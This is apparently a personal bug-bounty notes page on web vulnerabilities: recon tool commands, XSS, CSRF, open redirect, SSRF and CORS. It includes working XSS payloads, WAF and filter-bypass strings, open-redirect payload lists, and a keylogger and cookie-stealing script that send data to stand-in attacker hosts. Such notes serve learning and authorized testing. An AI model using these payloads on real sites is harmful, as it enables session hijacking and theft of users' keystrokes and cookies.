---
layout: single
classes: #wide
title: "Vulns"
sidebar:
    title: "Vulns"
    nav: infosec
collection: infopages
permalink: /infosec/vulns/
toc: true
toc_sticky: true
author_profile: true
---

monitors with ssl mate -> new subdomains new ssl cert see online and can start looking at it

# EMAIL - ryushe@bugcrowdninja-demon.com

# DNS
## DNS rebinding 
[blog](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-rebinding)
* Attempts to bypass restrictions of SOP
1. register domain eg. `http://badsite.com` delegating site to personal controled dns
1. employee clicks on `http://badsite.com` 
1. dns controlled by bad actor sends correct ip to employees request with short TTL
    - dns sets the ttl policy
1. employee browser downloads page with malicious code binding to local ip of attackers dns
1. `http://badsite.com` now points to 60.6.6.60. Because ip is same origin attackers code can exfiltrate company information and sensitive data

# Domain Enumeration/recon
Amass - discovering subdomains & content    
- ex: `amass enum -brute -active -d domain.com -o amass-output.txt`  

httprobe - find working http & https servers    
- ex: `cat amass-output.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 50 | tee online-domains.txt `   

[anew](https://github.com/tomnomnom/anew) - see what domains might be new  
- ex: `cat new-output.txt | anew old-output.txt | httprobe`

dnsgen - through look thru of urls  
- ex: `cat amass-output.txt | dnsgen - | httprobe`  

aquatone - visual inspection (accepts endpoints and files as well as domains)  
- ex: `cat domains-endpoints.txt | aquatone`  

ffuf - fuzzing  

waybackmachine scanner - srapes /robots.txt for all doamins and scrape as many years as possible  
- url - [here](https://gist.github.com/mhmdiaa)
- after scan each endpoint with ffuf
- Scraping /robots.txt but also main homepage of each subdomain  

Param scanner - scraping each endpoint and searching for input names, ids and js params
- [input scanner]( https://github.com/zseano/InputScanner) - looks for `<input>` and scrapes names and id then try it as a peram  
- Link finder/parameth also good peram scanners  

Any changes - takes list of urls and regulary changes for new changes on page

# WAFs
## LEARN:   
everything about WAF from security perspective [here](https://github.com/0xInfection/Awesome-WAF)

# XSS
- `<img src=x onerror=alert(0)>`
- `?"></script><base%20c%3D=href%3Dhttps:\mysite>`
    - ex script to send back to site
- `'"-->`  
- [Payloads](https://github.com/payloadbox/xss-payload-list)
- Tools (not sure abou thte category test):
    - general [xssrapy](https://github.com/DanMcInerney/xsscrapy)
    - DOM [blueclosure](https://www.blueclosure.com/) - paid
    - [KNOXSS](https://knoxss.me/?page_id=1974) - paid

## notes
- if has sink (place to exe) don't need script tag since program will call for us

## XSS WAF filter?
- yes - bad since xss most common to mitigate vuln
    - what else are they just filtering?
        - eg: SSRF? Filtering just internal ips?
    - shows overall security

### WAF Bypasses
- break up words for ex: `<sscriptcript>` -> `<script>` when script gets taken out
- encode (url / html)
- polgots - 0 idea what is
    - ex: `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e`

## Testing for XSS and filtering
1. testing different encoding - weird behavior?
- does single encoding or double encoding do anything?
    - encoding changes once sent may be finding
    - encoding is always defaulted to the same might be nothing
- Ghetto Bypass (encodings to try) - [here](https://d3adend.org/xss/ghettoBypass)
2. Reverse engineering the dev's thoughts 
    - why did they create this and where else could this filter be:
        - filtering full tags but not filtering `<script`
            - bypass: `<script src=//mysite.com?c=`
                - appending tag to parameter value within the html
        - blacklist of bad html tags?
            - maybe forgot to add `<svg>`
        - how does website handle encodings, file uploads
    - Testing for XSS flow:
        - how are non malicious html tags handled 
            - eg: `<h1>`
        - Incomplete tags?
            - eg: `<iframe src=//url.com/c=`
        - encodings?
        - blacklist?

XSS filter bypass - [here](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)

## POC
alerts and such blocked?  
simple: `console.log("exploit completed)` works

## post exploit payloads
* keylogger - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`  
* execute js - `<script></script>`
* business logic - `<script>user.changeEmail('attacker@hacker.thm');</script>`
* Cookies - `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`


## types
* reflected - editing parameters to insert malicious code
    - places to check:
        - url file path
        - parameters in url query string
        - http headers
* stored - put into db / hosted on webstite 
    - places to check:
        - comments on blog
        - user profile info
        - web listings
* dom - js execution happens direclty in the browser without any new pages being loaded/data submitted to backend code
    - places to check:
        - code
    - how to test:
        - look in code for places attacker can have control over
            - eg: `window.location.x` perams
        - see how the places are handled and whether values are ever written to web page's dom or pased to unsafe js methods eg: `eval()`
    - dom = programming interface for HTML and XMS docs
        - represents page so taht programs can change doc structure/style/content
    - ex: js gets contents from the window.location.hash peram and writes onto page in the currently being viewed section
* blind - payload gets stored and executed (cant see it being ran)
    - testing - ensure payload has callback (tool: xss hunter express)
    - impact - attacker could make calls to attacker's website, revealing the
    staff portal URL, the staff member's cookies, and even the contents of the
    portal page that is being viewed. 
    - Now the attacker could potentially hijack the staff member's session and have access to the private portal.
    - ex: website contains  contact where you can message a member of staff 
        - not being checked for malicious code
        - messages -> support tickets for staff on priv portal

# CSRF
force user to do action on target website from your website (usually vial HTML form ) 
- eg: `<form action="/login" method="POST">`

Places to start:
- areas where should be secure
    - eg: updating account info

What did it do?:
- reflect changes but with SCRF error?
- info shown?

If an area has different protections? Why
- Different team
- old codebase
- different peram name

Common approach to security:
- devs check if referer is their website
    - if so execute
    - if not disreguard
- Issue - sometimes checks only if referer header is found if not, no checks are done
- Gets blank referer:
    - `<meta name="referrer" content="no-referrer" />`
    `<iframe src=”data:text/html;base64,form_code_here”>`
- Sometimes only check if domain is found in the referer
    - creating domain on personal site and visting may bypass
        - `https://www.yoursite.com/https://www.theirsite.com/`

Since CSRF enables us to make requests under another user, can we force a user to be charged?

# Open url redirects
Common in programs that use oauth with tokens and a redirect     

encode: & ? # / \  
- App will decode AFTER first redirect
- sometimes need to double encode

Could be dropped because of:
* too many redirects
* too many parameters

ex redirect:   
normal: `https://www.target.com/login?client_id=123&redirect_url=/sosecure`  
bad: `https://www.target.com/login?client_id=123&redirect_url=https://www.target.com/redirect?redirect=1&url=https://www.zseano.com/`
- this example leads to token being sent to zseano.com

## Keywords for redirection
```
goto
redirect
location
url
link
dest / destination
referer
forward
```

## Common issues
* Not ecoding values correctly
    - especially if target allows for /localRedirects

## Google searching for vuln endpoints
```
return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl
```

## Is XSS possible?
- redirect -> Location: (not possible)
- redirect -> window.location: (test for js)

common bypass filters:  
```
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%07script:prompt`0`
java%09scrip%07t:prompt`0`
jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript
pjavascriptt:confirm`0`

```

## Payloads:
``` 
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com
```

# SSRF
In scope domain issueing request to an url/endpoint you have defined  
- Looking for API console (typically on dev docs page)
    - typically has freatures that take a url peram to execute code
- Test how handle redirects
- Setting up simple redirect script with XAMPP
    - NGROK to expose it
    - add sleep(time) - see if server hangs out
    - mayber filter only checking parameter value and not the redirect value
    - check if open redirect works
 
## Tools: 
- XAMPP - run php code locally 
- NGROK - public ip 

# Cross origin resource sharing (CORS)

## Server-generated ACAO header from client-specified Origin header
ex: receives request
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```  
responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

Access-Control-Allow-Credentials: true  
- states that requests can include cookies

Access-Control-Allow-Origin  
- means any domain can access resources from the vulnerable domain

# keep in mind
- Devs make mistakes  
- Stick to what you know and don't get overwhelmed
- recon recon recon

